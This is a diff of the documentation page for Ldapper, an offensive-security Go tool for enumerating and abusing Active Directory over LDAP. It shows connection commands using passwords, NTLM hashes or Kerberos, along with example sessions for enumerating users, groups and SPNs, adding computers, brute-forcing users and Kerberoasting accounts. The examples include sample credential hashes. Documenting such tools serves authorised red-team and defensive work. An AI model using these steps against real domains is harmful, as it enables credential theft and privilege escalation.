@@ -13,13 +13,10 @@ tags : ['Other', 'LDAP', 'Active Directory']
 
 A GoLang tool to enumerate and abuse LDAP. Made simple.
 
-Ldapper was created with for use in offensive security engagements for targeted user enumeration, group enumeration, and more. Ldapper uses familiar "net" commands such as "net user" and "net group" to perform all its queries and its output follows the same conventions. Ldapper's user interface operates as a pseudo-interactive shell, where the user can input commands until exited. All traffic goes over the LDAP(S) protocol with a singular bind to help you better blend into the network.
+Ldapper was created with for use in offensive security engagements for user enumeration, group enumeration, and more. Ldapper uses familiar "net" commands such as "net user" and "net group" to perform all its queries and its output follows the same conventions. Ldapper's user interface operates as a interactive shell, where the user can input commands until exited. All traffic goes over the LDAP(S) protocol with a singular bind to help you better blend into the network. Ldapper is proxy aware and supports NTLM authentication with a user's hash. Additionally, this tool can perform modification actions within LDAP.
 
 Ldapper is proxy aware and supports NTLM authentication with a user's hash. Additionally, this tool can perform modification actions within LDAP. More functionality is planned for later releases, but for now additional supported command functions are:
 
-Add Domain Computers
-Add/Remove Arbitrary SPNs
-Kerberoast
 This tool should be considered in its beta stages. Please report any bugs, issues, or functionality ideas for future releases.
 
 ## Installation
@@ -33,60 +30,71 @@ go build
 ## Usage
 
 ```plain
-./ldapper [OPTIONS]
+./ldapper [command]
 ```
 
 ## Flags
 
 ```plain
-  -H string
-        Use NTLM authentication
-  -dc string
-        IP address or FQDN of target DC
-  -h    Display help menu
-  -o string
-        Log file
-  -p string
-        Password
-  -s    Bind using LDAPS
-  -socks4 string
-        SOCKS4 Proxy Address (ip:port)
-  -socks4a string
-        SOCKS4A Proxy Address (ip:port)
-  -socks5 string
-        SOCKS5 Proxy Address (ip:port)
-  -u string
-        Username (username@domain)
-Examples:
-        With Password:  ./ldapper -u <username@domain> -p <password> -dc <ip/FQDN> -s
-        With Hash:      ./ldapper -u <username@domain> -H <hash> -dc <ip/FQDN> -s
+Initialize/Deinitialize:
+  connect     Connect to a LDAP server
+  disconnect  Close the LDAP connection
+
+Ldapper Commands:
+  addComputer  Add a computer to the domain
+  roast        Kerberoast a user with an SPN
+  spn          Add or remove a SPN on a user account
+
+Ldapper Enumeration:
+  brute  Brute force users from a file. No authentication needed.
+
+Ldapper Queries:
+  dacl     Query the DACL of a target object
+  getspns  Query all user accounts with an SPN
+  groups   Query the groups for a target user
+  mquota   Query the machine account quota of the domain
+  net      Run net commands
+  passpol  Query the password policy of the domain
+
+Flags:
+  -h, --help        display help
+      --nocolor     disable color output
 ```
 
 ## Examples
 
 ### Setting up connection
 
-* Username/password authentication: `./ldapper -dc 10.0.0.20 -u crypt0rr@offsec.nl -p Welkom1234`
-* NTLM Authentication: `./ldapper -dc 10.0.0.20 -u crypt0rr@offsec.nl -H 97f2592347d8fbe42be381726ff9ea83`
+NOTE: `-s` enables LDAP**S** instead of LDAP. LDAP by default is TCP based but Microsoft tend to use UDP for LDAP. LDAP**S** is TCP.
+
+Optional flags:
+
+- `-t` - Enable timestamps for each command performed
+- `-s` - Enable the use of LDAP**S**
+
+With Password:  connect -u <username@domain> -p <password> -d <ip/FQDN>
+With Hash:      connect -u <username@domain> -H <hash> -d <ip/FQDN>
+With Kerberos:  connect -u <username@domain> -k -d <ip/FQDN>
 
 ### Starting LDAP-shell session running 'net user'
 
 ```plain
-> net user administrator
+crypt0rr@10.10.20.52:389 » net user administrator
 
 User Information - administrator:
 -------------------------------------------------------------------------------
 User Name:              Administrator
 Full Name:              Administrator
 Comment:                Built-in account for administering the computer/domain
-User Account Control:   USER_DONT_EXPIRE_PASSWORD
-                        USER_NORMAL_ACCOUNT
+User Account Control:   USER_NORMAL_ACCOUNT
+                        USER_DONT_EXPIRE_PASSWORD
                         (If Enabled, Check Last Lockout Time)
 Last Lockout Time: 
 Account Expires:        Never
-Password Last Set:      08/09/2022 11:08:05 AM
+Password Last Set:      12/23/2022 12:40:26 PM
 Home Directory: 
-Last logon:             09/16/2022 01:20:30 PM
+Last Logon:             04/04/2023 05:57:05 PM
+Logon Count:            70
 Mail: 
 SPN(s): 
 ```
@@ -94,20 +102,20 @@ SPN(s):
 ### Retrieve ms-DS-MachineAccountQuota
 
 ```plain
-> mquota
+crypt0rr@10.10.20.52:389 » mquota
 Machine Account Quota: 10
 ```
 
 ### Checking password policy
 
 ```plain
-> passpol
+crypt0rr@10.10.20.52:389 » passpol
 
 Minimum Password Length:        7
 Password History Length:        24
 Lockout Threshold:              0
-Lockout Duration:               30      minutes
-Reset Account Lockout Counter:  30      minutes
+Lockout Duration:               10      minutes
+Reset Account Lockout Counter:  10      minutes
 Minimum Password Age:           1       day(s)
 Maximum Password Age:           42      day(s)
 
@@ -117,29 +125,31 @@ Password Complexity:            DOMAIN_PASSWORD_COMPLEX
 ### Retrieve group members 'net group'
 
 ```plain
-> net group Domain Admins
+crypt0rr@10.10.20.52:389 » net group "Domain Admins"
 Comment: Designated administrators of the domain
 
 Primary Group Members
 -------------------------------------------------------------------------------
-ThisIsAGroupWithinDA (Group)    johndo-adm              KIETH_MCINTOSH
-STEWART_SANDERS                 ERICH_ATKINS            GERTRUDE_KNIGHT
-AUGUSTINE_PUCKETT               Administrator
+NestedDAGroup (Group)           QUINN_NASH              ERNIE_GUTHRIE
+DAMIAN_DUFFY                    GARTH_HARRINGTON        ALI_SANCHEZ
+Administrator
+```
 
+A nested group is visible by the `(Group)` naming. To retrieve the members of this nested group use `net nestedGroups`.
 
-> net group Account Operators
-Comment: Members can administer domain user and group accounts
+```plain
+crypt0rr@10.10.20.52:389 » net nestedGroups NestedDAGroup
+Comment: 
 
 Primary Group Members
 -------------------------------------------------------------------------------
-crypt0rr        KIMBERLEY_CONTRERAS     LORENE_CLINE
-1060184468SA
+crypt0rr-adm             TANNER_ALSTON            BRANDON_LYNCH  
 ```
 
 ### Get list of SPNs and perform kerberoasting
 
 ```plain
-> getspns
+crypt0rr@10.10.20.52:389 » getspns
 SPN                     Username                PasswordLastSet                 LastLogon       Delegation
 CIFS/AWSWVIR1000000     HAL_MURRAY              2022-07-04 15:27:52 +0200 CEST  <never>
 CIFS/FINWWKS1000000     MYRON_FORD              2022-07-04 15:26:44 +0200 CEST  <never>
@@ -153,11 +163,13 @@ ftp/FINWWEBS1000001     RICKIE_RUSSO            2022-07-04 15:20:00 +0200 CEST  
 ftp/GOOWLPT1000001      ABE_MASON               2022-07-04 15:23:37 +0200 CEST  <never>
 ```
 
+Roasting supports both RC4 and AES.
+
 ```plain
-> roast HAL_MURRAY
-$krb5tgs$23$*HAL_MURRAY$OFFSEC.NL$HAL_MURRAY*$0d2768f9c9cb33b22e338cd4e732f3dd$6e47d8cb3701126a966d0c7697b[...]091b8b73a9a1dba92d661a
+crypt0rr@10.10.20.52:389 » roast rc4 BERRY_TRAVIS
+$krb5tgs$23$*BERRY_TRAVIS$OFFSEC.NL$BERRY_TRAVIS*$1eacfa05b0737825dcc664fabf2a8696$9bb5ddda4f021dcc414a67f768c5f06916c344c566769805f532dcd[...]
 ```
 
 ## URL List
 
-* [Github.com - ldapper](https://github.com/Synzack/ldapper)
+- [Github.com - ldapper](https://github.com/Synzack/ldapper)
